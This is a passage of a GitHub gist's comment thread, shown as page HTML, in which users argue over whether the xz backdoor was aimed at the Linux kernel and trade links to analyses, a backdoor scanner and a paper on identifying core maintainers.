    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5022865-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/avbentem/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/avbentem">avbentem</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5022865#gistcomment-5022865" id="gistcomment-5022865-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-14T12:39:36Z" class="no-wrap">Apr 14, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <p dir="auto"><a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/cwegener/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/cwegener">@cwegener</a> I'm guessing <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/tdkuehnel/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/tdkuehnel">@tdkuehnel</a> may be referring to what happened in 2022 according to <a href="https://boehs.org/node/everything-i-know-about-the-xz-backdoor#2022" rel="nofollow">a list of events</a> curated by <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/boehs/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/boehs">@boehs</a>.</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5022865" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="WxqWBlW7Kuj1pkupzqMirxXlAUlA0RU-LqgLduBJuJVWUtue4SqJn0-pYmdxKhi9SP7WyjjBXdnzERUTx1vRmA" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5022865/edit_form?textarea_id=gistcomment-5022865-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/flybyray/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/flybyray"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/804661?s=80&amp;v=4" width="40" height="40" alt="@flybyray" /></a>
    </div>
    <div id="gistcomment-5023188" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5023188-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/flybyray/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/flybyray">flybyray</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5023188#gistcomment-5023188" id="gistcomment-5023188-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-14T22:05:56Z" class="no-wrap">Apr 14, 2024</relative-time></a>


      <span class="js-comment-edit-history">
  <span class="d-inline-block color-fg-muted">&#8226;</span>

  <details class="details-overlay details-reset d-inline-block dropdown hx_dropdown-fullscreen">
    <summary class="btn-link no-underline color-fg-muted js-notice">
      <div class="position-relative">
        <span>
          edited
          
        </span>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down v-align-middle">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
      </div>
    </summary>
    <details-menu
      class="dropdown-menu dropdown-menu-s width-auto py-0 js-comment-edit-history-menu"
      style="max-width: 352px; z-index: 99;"
      src="/user_content_edits/show_edit_history_log/GC_lADOAAxHNdoAIDIyMzk0OWQ1YTA3NGViYzNkY2U5ZWU3OGJhYWQ5ZTI3zgBMpdQ"
      preload
    >
      <include-fragment class="my-3" style="min-width: 100px;" aria-label="Loading...">
        <span data-view-component="true">
  <svg style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" aria-hidden="true" data-view-component="true" class="mx-auto d-block anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg>    <span class="sr-only">Loading</span>
</span>
      </include-fragment>
    </details-menu>
  </details>
</span>

    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <blockquote>
<p dir="auto"><a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/flybyray/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/flybyray">@flybyray</a> Conspiracy theories and insults from people like you are not helpful.</p>
</blockquote>
<p dir="auto">Perhaps you are in a position to take your sort of interference as an insult.</p>
<blockquote>
<p dir="auto">A huge amount of people all over the world who are highly competent in this area have been working on dissecting this exploit for 2 weeks, anyone who claims to have found something new on the technical side here in this discussion only demonstrates being clueless.</p>
</blockquote>
<p dir="auto">Are you implying that I am trying to claim something without a proof? And you try it to do only with a mere personal assertion? Pipes!</p>
<blockquote>
<p dir="auto">Please stop it.</p>
</blockquote>
<p dir="auto">I hope you do that and come back next time with meaningful additions and statements.<br>
I also hope that you understand what an honest discussion is, that you have to fight back when others try to play unfair by ignoring essential context or trying to distort the meaning of statements.</p>
<p dir="auto">To get back on track:</p>
<ul dir="auto">
<li>I joint this discussion just by pointing out that the ultimate target for a supply chain attack will be the kernel. I was just missing something here.</li>
<li>that there were surprising changes in the linux-next repo shortly before the backdoor became known. <a href="https://lwn.net/Articles/966143/" rel="nofollow">20/03/2024</a></li>
<li><a href="https://lwn.net/ml/linux-kernel/20240329195602.382cb1c99bb70e3d8c6093ae@linux-foundation.org/" rel="nofollow">discussions on the kernel mailing regarding this change to remove it</a>, but it was already pushed into linux-next
<ul dir="auto">
<li>now there is a newer comment <a href="https://lwn.net/ml/linux-kernel/20240404170103.1bc382b3@kaneli/" rel="nofollow">https://lwn.net/ml/linux-kernel/20240404170103.1bc382b3@kaneli/</a>  i am happy that my concern is addressed there. but i would be more happy if they would handle all compression tools equally. there should be a strict interface to comply with. i am not sure why only xz should be allowed to run in different form - it just shows that its internal working is to complex.</li>
</ul>
</li>
</ul>
<p dir="auto">Exactly what <a href="https://securelist.com/xz-backdoor-story-part-1/112354/" rel="nofollow">this recent conclusion section states:</a><br>
"...<br>
It’s evident that this backdoor is highly complex and employs sophisticated methods to evade detection. These include the multi-stage implantation in the XZ repository, as well as the complex code contained within the binary itself.</p>
<p dir="auto">There is still much more to explore about the backdoor’s internals, which is why we have decided to present this as Part I of the XZ backdoor series. ..."</p>
<p dir="auto">"the binary itself" could not be ignored as the master plan ( "golden piece") for a targeted supply chain kernel attack.<br>
<a href="#discussions-in-the-wake-of-this">especially the mentioned discussions</a> put important things( tangible error ) on the table.<br>
there may be other tools that are part of the build process and are assumed to be safe without question. someone has this concern even tries to scan complete package trees <a href="https://github.com/hlein/distro-backdoor-scanner">https://github.com/hlein/distro-backdoor-scanner</a></p>
<p dir="auto">i fear the structure of a suitable defense will look more complex.</p>
<p dir="auto">hopefully automation and statistics can help to spot risks.<br>
like you need to track maintainers and their commitment to projects. this is just an example:<br>
"""<br>
Many open-source software (OSS) projects are self-organized and do not maintain official lists with information on developer<br>
roles. So, knowing which developers take core and maintainer roles is, despite being relevant, often tacit knowledge. We propose<br>
a method to automatically identify core developers based on role permissions of privileged events triggered in GitHub issues<br>
and pull requests. In an empirical study on 25 GitHub projects, (1) we validate the set of automatically identified core developers<br>
with a sample of project-reported developer lists, and (2) we use our set of identified core developers to assess the accuracy of<br>
state-of-the-art unsupervised developer classification methods. Our results indicate that the set of core developers, which<br>
we extracted from privileged issue events, is sound and the accuracy of state-of-the-art unsupervised classification methods<br>
depends mainly on the data source (commit data vs. issue data) rather than the network-construction method (directed vs.<br>
undirected, etc.). In perspective, our results shall guide research and practice to choose appropriate unsupervised classification<br>
methods, and our method can help create reliable ground-truth data for training supervised classification methods.<br>
"""<br>
ref: <a href="https://www.se.cs.uni-saarland.de/publications/docs/BAJ+23.pdf" rel="nofollow">https://www.se.cs.uni-saarland.de/publications/docs/BAJ+23.pdf</a></p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5023188" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="_uRp_-NPm-zmyGDjkzbTllfJl_04c43B1AKKk6XRuc61nnQQgA1ZyjHlZkWUtL-ENAdPY5Y6ae-7OEh1bDLInA" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5023188/edit_form?textarea_id=gistcomment-5023188-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/calestyo/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/calestyo"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/919933?s=80&amp;v=4" width="40" height="40" alt="@calestyo" /></a>
    </div>
    <div id="gistcomment-5023212" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5023212-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/calestyo/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/calestyo">calestyo</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5023212#gistcomment-5023212" id="gistcomment-5023212-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-14T22:35:08Z" class="no-wrap">Apr 14, 2024</relative-time></a>


      <span class="js-comment-edit-history">
  <span class="d-inline-block color-fg-muted">&#8226;</span>

  <details class="details-overlay details-reset d-inline-block dropdown hx_dropdown-fullscreen">
    <summary class="btn-link no-underline color-fg-muted js-notice">
      <div class="position-relative">
        <span>
          edited
          
        </span>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-triangle-down v-align-middle">
    <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
</svg>
      </div>
    </summary>
    <details-menu
      class="dropdown-menu dropdown-menu-s width-auto py-0 js-comment-edit-history-menu"
      style="max-width: 352px; z-index: 99;"
      src="/user_content_edits/show_edit_history_log/GC_lADOAA4JfdoAIDIyMzk0OWQ1YTA3NGViYzNkY2U5ZWU3OGJhYWQ5ZTI3zgBMpew"
      preload
    >
      <include-fragment class="my-3" style="min-width: 100px;" aria-label="Loading...">
        <span data-view-component="true">
  <svg style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" aria-hidden="true" data-view-component="true" class="mx-auto d-block anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg>    <span class="sr-only">Loading</span>
</span>
      </include-fragment>
    </details-menu>
  </details>
</span>

    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <p dir="auto">I'm not the admin here (so obviously <a class="user-mention notranslate" data-hovercard-type="user" data-hovercard-url="/users/thesamesam/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="https://github.com/thesamesam">@thesamesam</a> decides what this is about and not me), but I had the impression so far that this gist was primarily giving an overview/index/references to the XZ backdoor - not about actual in-depth discussion about the various fields (reverse engineering, OSint, etc. pp) related to it.</p>
<p dir="auto">That was the nice thing about it, getting only really new/concrete stuff from it.</p>
<p dir="auto">There do seem to be numerous places which are dedicated to in-depth discussion (and arguing ;-) ) like <a href="https://discord.gg/TPz7gBEE" rel="nofollow">https://discord.gg/TPz7gBEE</a> (for both, reverse engineering and OSint).</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5023212" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="ygkgVfA2bayD90kbKEKMK7xamD5SYQUDmh6s4Mwuve9LE-rwuuQT42D3Lko3to_Ancb6x6eOM3qG1Wiljg8Tqw" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5023212/edit_form?textarea_id=gistcomment-5023212-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/AdrianBunk/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/AdrianBunk"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/3358267?s=80&amp;v=4" width="40" height="40" alt="@AdrianBunk" /></a>
    </div>
    <div id="gistcomment-5023235" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5023235-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/AdrianBunk/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/AdrianBunk">AdrianBunk</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5023235#gistcomment-5023235" id="gistcomment-5023235-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-14T23:21:18Z" class="no-wrap">Apr 14, 2024</relative-time></a>


      
    </div>

  </h3>
</div>


        <div class="edit-comment-hide">
  <task-lists disabled sortable>
    <div class="comment-body markdown-body js-comment-body soft-wrap user-select-contain d-block">
      <blockquote>
<p dir="auto">I joint this discussion just by pointing out that the ultimate target for a supply chain attack will be the kernel.</p>
</blockquote>
<p dir="auto">That's nonsense.</p>
<p dir="auto">Nothing you provided indicates that there was actually anything malicious submitted to the kernel, and it would be unbelievably stupid for the attacker to try to add more exploits since this would increase the risk that the openssh backdoor gets detected.</p>
<p dir="auto">The openssh backdoor would have given the attacker remote administrator access to most Linux servers on the internet.<br>
This is already the ultimate backdoor.</p>
<p dir="auto">And here is not the right place for people to present whatever thoughts or theories they come up with, please do that in a more appropriate location.</p>
    </div>
  </task-lists>
  
</div>


        <!-- '"` --><!-- </textarea></xmp> --></option></form><form class="js-comment-update" data-type="json" data-turbo="false" action="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5023235" accept-charset="UTF-8" method="post"><input type="hidden" name="_method" value="put" autocomplete="off" /><input type="hidden" name="authenticity_token" value="cGdgj9LIgZ4A49FZdBO22A5s-x83xaBV3zcau9QJ01Fcb1L_W5kzJuFbr152pKQqGU4ibg91dULzAtrwd2zSwg" autocomplete="off" />
      <include-fragment
  
  loading="lazy"
  src="/thesamesam/223949d5a074ebc3dce9ee78baad9e27/comments/5023235/edit_form?textarea_id=gistcomment-5023235-body&amp;comment_context=discussion"
  class="previewable-comment-form js-comment-edit-form-deferred-include-fragment"
>
  <p class="text-center mt-3" data-hide-on-error>
    <span data-view-component="true">
  <svg aria-label="Loading..." style="box-sizing: content-box; color: var(--color-icon-primary);" width="32" height="32" viewBox="0 0 16 16" fill="none" role="img" data-view-component="true" class="anim-rotate">
    <circle cx="8" cy="8" r="7" stroke="currentColor" stroke-opacity="0.25" stroke-width="2" vector-effect="non-scaling-stroke" fill="none" />
    <path d="M15 8a7.002 7.002 0 00-7-7" stroke="currentColor" stroke-width="2" stroke-linecap="round" vector-effect="non-scaling-stroke" />
</svg></span>
  </p>
  <p class="ml-1 mb-2 mt-2" data-show-on-error hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    Sorry, something went wrong.
  </p>
</include-fragment>

</form>
    
</div>

  </div>
  <div class="TimelineItem d-block js-comment-container">
    <div class="avatar-parent-child TimelineItem-avatar d-none d-md-block">
      <a class="d-inline-block" data-hovercard-type="user" data-hovercard-url="/users/the-lne/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/the-lne"><img class=" avatar-user" src="https://avatars.githubusercontent.com/u/117259028?s=80&amp;v=4" width="40" height="40" alt="@the-lne" /></a>
    </div>
    <div id="gistcomment-5023281" class="timeline-comment-group js-minimizable-comment-group js-targetable-element my-0 comment previewable-edit js-task-list-container js-comment timeline-comment timeline-comment--caret ml-n3 js-minimize-container unminimized-comment">
        <div class="timeline-comment-header clearfix d-flex"  data-morpheus-enabled="false">
  <div class="timeline-comment-actions flex-shrink-0 d-flex flex-items-center">
    <details class="details-overlay details-reset position-relative d-inline-block">
      <summary data-view-component="true" class="timeline-comment-action Link--secondary Button--link Button--medium Button">  <span class="Button-content">
    <span class="Button-label"><svg aria-label="Show options" role="img" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-kebab-horizontal">
    <path d="M8 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3ZM1.5 9a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Zm13 0a1.5 1.5 0 1 0 0-3 1.5 1.5 0 0 0 0 3Z"></path>
</svg></span>
  </span>
</summary>

      <details-menu
        class="dropdown-menu dropdown-menu-sw show-more-popover color-fg-default"
        style="width:185px"
        src=""
        preload
        
      >
          <span data-view-component="true">
  <clipboard-copy aria-label="Copy link" for="gistcomment-5023281-permalink" role="menuitem" data-view-component="true" class="dropdown-item btn-link">
      
            Copy link

</clipboard-copy>  <div aria-live="polite" aria-atomic="true" class="sr-only" data-clipboard-copy-feedback></div>
</span>      </details-menu>
    </details>
  </div>

  <div class="d-none d-sm-flex">
      

      

  </div>

  <h3 class="f5 text-normal" style="flex: 1 1 auto">
    <div>
      

      <strong>
            <a class="author Link--primary text-bold css-overflow-wrap-anywhere " data-hovercard-type="user" data-hovercard-url="/users/the-lne/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self" href="/the-lne">the-lne</a>
  

      </strong>

      

      commented 


        <a href="/thesamesam/223949d5a074ebc3dce9ee78baad9e27?permalink_comment_id=5023281#gistcomment-5023281" id="gistcomment-5023281-permalink" class="Link--secondary js-timestamp"><relative-time datetime="2024-04-15T01:05:29Z" class="no-wrap">Apr 15, 2024</relative-time></a>

        via email <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-mail">
